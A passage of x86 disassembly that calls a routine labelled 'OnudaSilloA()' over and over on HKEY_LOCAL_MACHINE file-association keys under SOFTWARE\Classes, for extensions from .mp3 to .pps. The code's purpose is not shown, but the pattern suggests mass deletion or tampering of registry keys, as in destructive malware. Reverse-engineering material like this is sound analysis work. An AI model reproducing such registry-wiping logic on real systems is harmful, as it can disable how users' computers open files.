  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000244h
  push 0042585Ch ; "SOFTWARE\Classes\.mp3"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000245h
  push 0042588Ch ; "SOFTWARE\Classes\.mp4"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000246h
  push 004258ECh ; "SOFTWARE\Classes\.mpa\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000247h
  push 00425940h ; "SOFTWARE\Classes\.mpa\OpenWithProgIds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000248h
  push 00425990h ; "SOFTWARE\Classes\.mpa\OpenWithList\wmplayer.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000249h
  push 004259F4h ; "SOFTWARE\Classes\.mpa\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000024Ah
  push 00425A40h ; "SOFTWARE\Classes\.mpa"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000024Bh
  push 00425A70h ; "SOFTWARE\Classes\.mpc"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000024Ch
  push 00425AD0h ; "SOFTWARE\Classes\.mpe\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000024Dh
  push 00425B60h ; "SOFTWARE\Classes\.mpe\ShellEx"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000024Eh
  push 00425BA0h ; "SOFTWARE\Classes\.mpe\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000024Fh
  push 00425BF4h ; "SOFTWARE\Classes\.mpe\OpenWithProgIds"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000250h
  push 00425C44h ; "SOFTWARE\Classes\.mpe\OpenWithList\wmplayer.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000251h
  push 00425CA8h ; "SOFTWARE\Classes\.mpe\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000252h
  push 00425CF4h ; "SOFTWARE\Classes\.mpe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000253h
  push 00425D24h ; "SOFTWARE\Classes\.mpeg\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000254h
  push 00425DB4h ; "SOFTWARE\Classes\.mpeg\ShellEx"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000255h
  push 00425DF8h ; "SOFTWARE\Classes\.mpeg\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000256h
  push 00425E90h ; "SOFTWARE\Classes\.mpeg\OpenWithProgIds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000257h
  push 00425EE4h ; "SOFTWARE\Classes\.mpeg\OpenWithList\wmplayer.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000258h
  push 00425F4Ch ; "SOFTWARE\Classes\.mpeg\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000259h
  push 00425F98h ; "SOFTWARE\Classes\.mpeg"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000025Ah
  push 00425FCCh ; "SOFTWARE\Classes\.mpg\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000025Bh
  push 00425E50h ; "SOFTWARE\Classes\.mpg\ShellEx"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000025Ch
  push 00426078h ; "SOFTWARE\Classes\.mpg\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000025Dh
  push 004260CCh ; "SOFTWARE\Classes\.mpg\OpenWithProgIds"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000025Eh
  push 0042611Ch ; "SOFTWARE\Classes\.mpg\OpenWithList\wmplayer.exe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000025Fh
  push 00426180h ; "SOFTWARE\Classes\.mpg\OpenWithList"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000260h
  push 004261CCh ; "SOFTWARE\Classes\.mpg"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000261h
  push 004261FCh ; "SOFTWARE\Classes\.mpv2\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000262h
  push 00426254h ; "SOFTWARE\Classes\.mpv2\OpenWithProgIds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000263h
  push 004262A8h ; "SOFTWARE\Classes\.mpv2\OpenWithList\wmplayer.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000264h
  push 00426310h ; "SOFTWARE\Classes\.mpv2\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000265h
  push 0042635Ch ; "SOFTWARE\Classes\.mpv2"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000266h
  push 00426390h ; "SOFTWARE\Classes\.msc"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000267h
  push 004263C0h ; "SOFTWARE\Classes\.msg\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000268h
  push 00425AA0h ; "SOFTWARE\Classes\.msg"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000269h
  push 004258BCh ; "SOFTWARE\Classes\.msi"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000026Ah
  push 0042642Ch ; "SOFTWARE\Classes\.msp"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000026Bh
  push 0042645Ch ; "SOFTWARE\Classes\.MsRcIncident"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000026Ch
  push 004264A0h ; "SOFTWARE\Classes\.msstyles"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000026Dh
  push 004264DCh ; "SOFTWARE\Classes\.MSWMM"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000026Eh
  push 00426510h ; "SOFTWARE\Classes\.mv\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000026Fh
  push 00426564h ; "SOFTWARE\Classes\.mv"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000270h
  push 00426594h ; "SOFTWARE\Classes\.mydocs\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000271h
  push 0042660Ch ; "SOFTWARE\Classes\.mydocs"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000272h
  push 00426644h ; "SOFTWARE\Classes\.ncb\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000273h
  push 00426698h ; "SOFTWARE\Classes\.ncb"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000274h
  push 004266C8h ; "SOFTWARE\Classes\.nfo"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000275h
  push 004266F8h ; "SOFTWARE\Classes\.nls"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000276h
  push 00426728h ; "SOFTWARE\Classes\.NMW"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000277h
  push 00426758h ; "SOFTWARE\Classes\.nsc\DefaultIcon"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000278h
  push 004267A0h ; "SOFTWARE\Classes\.nsc"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000279h
  push 004267E8h ; "SOFTWARE\Classes\.nvr"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000027Ah
  push 00426818h ; "SOFTWARE\Classes\.nws"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000027Bh
  push 00426848h ; "SOFTWARE\Classes\.obj\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000027Ch
  push 0042689Ch ; "SOFTWARE\Classes\.obj"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000027Dh
  push 004268CCh ; "SOFTWARE\Classes\.oc_\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000027Eh
  push 00426920h ; "SOFTWARE\Classes\.oc_"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000027Fh
  push 00426950h ; "SOFTWARE\Classes\.oca"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000280h
  push 004269C4h ; "SOFTWARE\Classes\.ocx\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000281h
  push 00426A18h ; "SOFTWARE\Classes\.ocx"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000282h
  push 00426A48h ; "SOFTWARE\Classes\.odc\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000283h
  push 00426A9Ch ; "SOFTWARE\Classes\.odc"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000284h
  push 00426ACCh ; "SOFTWARE\Classes\.ogg"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000285h
  push 00426AFCh ; "SOFTWARE\Classes\.ogm"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000286h
  push 00426B2Ch ; "SOFTWARE\Classes\.otf"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000287h
  push 00426B5Ch ; "SOFTWARE\Classes\.p10"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000288h
  push 00426980h ; "SOFTWARE\Classes\.p12"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000289h
  push 00426BA0h ; "SOFTWARE\Classes\.p7b"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000028Ah
  push 00426BD0h ; "SOFTWARE\Classes\.p7c"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000028Bh
  push 00426C00h ; "SOFTWARE\Classes\.p7m"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000028Ch
  push 00426C30h ; "SOFTWARE\Classes\.p7r"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000028Dh
  push 00426C60h ; "SOFTWARE\Classes\.p7s"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000028Eh
  push 00426C90h ; "SOFTWARE\Classes\.pag"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000028Fh
  push 00426CC0h ; "SOFTWARE\Classes\.pas"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000290h
  push 00426CF0h ; "SOFTWARE\Classes\.pbk"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000291h
  push 00426D20h ; "SOFTWARE\Classes\.pch\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000292h
  push 00426D74h ; "SOFTWARE\Classes\.pch"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000293h
  push 00426DA4h ; "SOFTWARE\Classes\.pdb\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000294h
  push 00426DF8h ; "SOFTWARE\Classes\.pdb"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000295h
  push 00426E28h ; "SOFTWARE\Classes\.pds\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000296h
  push 00426E7Ch ; "SOFTWARE\Classes\.pds"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000297h
  push 00426EACh ; "SOFTWARE\Classes\.pfm"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000298h
  push 00426EDCh ; "SOFTWARE\Classes\.pfx"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000299h
  push 00426F0Ch ; "SOFTWARE\Classes\.pgx"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000029Ah
  push 00426F50h ; "SOFTWARE\Classes\.php3"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000029Bh
  push 00426F84h ; "SOFTWARE\Classes\.pic\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000029Ch
  push 00426FD8h ; "SOFTWARE\Classes\.pic"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000029Dh
  push 00427008h ; "SOFTWARE\Classes\.pif"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000029Eh
  push 00427038h ; "SOFTWARE\Classes\.pko"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000029Fh
  push 00427068h ; "SOFTWARE\Classes\.pl\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002A0h
  push 004270BCh ; "SOFTWARE\Classes\.pl"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002A1h
  push 004270ECh ; "SOFTWARE\Classes\.plg"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002A2h
  push 0042711Ch ; "SOFTWARE\Classes\.pma\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002A3h
  push 00427170h ; "SOFTWARE\Classes\.pma"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002A4h
  push 004271A0h ; "SOFTWARE\Classes\.pmc\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002A5h
  push 004271F4h ; "SOFTWARE\Classes\.pmc"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002A6h
  push 00427224h ; "SOFTWARE\Classes\.pml\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002A7h
  push 00427278h ; "SOFTWARE\Classes\.pml"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002A8h
  push 004272A8h ; "SOFTWARE\Classes\.pmr\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002A9h
  push 00427300h ; "SOFTWARE\Classes\.pmr"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002AAh
  push 00427330h ; "SOFTWARE\Classes\.pmw"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002ABh
  push 00427360h ; "SOFTWARE\Classes\.pnf"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002ACh
  push 00427390h ; "SOFTWARE\Classes\.png\OpenWithProgids"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002ADh
  push 004273E0h ; "SOFTWARE\Classes\.png\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002AEh
  push 00427434h ; "SOFTWARE\Classes\.png"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002AFh
  push 00427464h ; "SOFTWARE\Classes\.pot\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002B0h
  push 004274DCh ; "SOFTWARE\Classes\.pot"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002B1h
  push 0042750Ch ; "SOFTWARE\Classes\.pps\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 000002B2h
  push 00427560h ; "SOFTWARE\Classes\.pps"
  lea eax, var_24
  push eax
